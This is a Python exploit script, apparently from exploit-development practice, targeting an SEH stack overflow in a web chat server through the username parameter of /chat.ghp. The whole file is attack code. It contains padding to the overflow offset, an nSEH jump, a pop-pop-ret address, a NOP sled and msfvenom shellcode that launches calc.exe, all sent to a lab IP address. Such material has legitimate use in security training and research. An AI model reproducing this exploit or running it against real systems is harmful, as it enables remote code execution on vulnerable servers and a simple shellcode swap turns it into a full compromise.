#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import sys
import socket
from struct import pack

host = '192.168.122.49'
port = 80

# msfvenom -p windows/exec cmd=calc.exe -b "\x00\x20" -f python -v shellcode EXITFUNC=thread
shellcode =  b""
shellcode += b"\xdb\xd2\xba\x49\x84\xa7\x1a\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x31\x31\x56\x18\x83\xc6\x04"
shellcode += b"\x03\x56\x5d\x66\x52\xe6\xb5\xe4\x9d\x17\x45"
shellcode += b"\x89\x14\xf2\x74\x89\x43\x76\x26\x39\x07\xda"
shellcode += b"\xca\xb2\x45\xcf\x59\xb6\x41\xe0\xea\x7d\xb4"
shellcode += b"\xcf\xeb\x2e\x84\x4e\x6f\x2d\xd9\xb0\x4e\xfe"
shellcode += b"\x2c\xb0\x97\xe3\xdd\xe0\x40\x6f\x73\x15\xe5"
shellcode += b"\x25\x48\x9e\xb5\xa8\xc8\x43\x0d\xca\xf9\xd5"
shellcode += b"\x06\x95\xd9\xd4\xcb\xad\x53\xcf\x08\x8b\x2a"
shellcode += b"\x64\xfa\x67\xad\xac\x33\x87\x02\x91\xfc\x7a"
shellcode += b"\x5a\xd5\x3a\x65\x29\x2f\x39\x18\x2a\xf4\x40"
shellcode += b"\xc6\xbf\xef\xe2\x8d\x18\xd4\x13\x41\xfe\x9f"
shellcode += b"\x1f\x2e\x74\xc7\x03\xb1\x59\x73\x3f\x3a\x5c"
shellcode += b"\x54\xb6\x78\x7b\x70\x93\xdb\xe2\x21\x79\x8d"
shellcode += b"\x1b\x31\x22\x72\xbe\x39\xce\x67\xb3\x63\x84"
shellcode += b"\x76\x41\x1e\xea\x79\x59\x21\x5a\x12\x68\xaa"
shellcode += b"\x35\x65\x75\x79\x72\x89\x97\xa8\x8e\x22\x0e"
shellcode += b"\x39\x33\x2f\xb1\x97\x77\x56\x32\x12\x07\xad"
shellcode += b"\x2a\x57\x02\xe9\xec\x8b\x7e\x62\x99\xab\x2d"
shellcode += b"\x83\x88\xcf\xb0\x17\x50\x3e\x57\x90\xf3\x3e"

# Payload de 800
buffer = 800
payload = b"A" * 217 # Offset 221
payload += pack('<I', 0x06eb9090) # nSEH - Jmp short 08
payload += pack('<I', 0x100125bd)  # SEH - 0x100125bd - P/P/R
payload += b"\x90" * 10
payload += shellcode
payload += b"\x90" * (buffer - len(payload))

# Nao alterar
buffer = b"GET /chat.ghp?username=" + payload + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 192.168.122.49:80\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://192.168.122.49\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")